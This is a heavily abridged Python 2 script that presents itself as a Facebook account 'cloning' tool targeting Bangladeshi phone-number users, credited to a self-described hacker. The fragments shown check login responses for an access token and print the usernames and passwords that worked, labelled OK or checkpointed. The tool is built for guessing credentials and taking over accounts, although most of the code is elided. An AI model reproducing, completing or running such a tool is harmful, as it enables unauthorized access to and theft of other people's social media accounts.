...
psb('\x1b[1;32mBANGLADESH NUPUR 11 DIGIT CLONING START PLEASE WAIT ..........')
...
def menu():
    ...
    print 'AUTHOR   : ABU-RAIHAN'

    print 'FACEBOOK : BEST-11 HACKER'

    print 'GITHUB     : github.com/falto4437'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[Nupur-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[Nupur-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
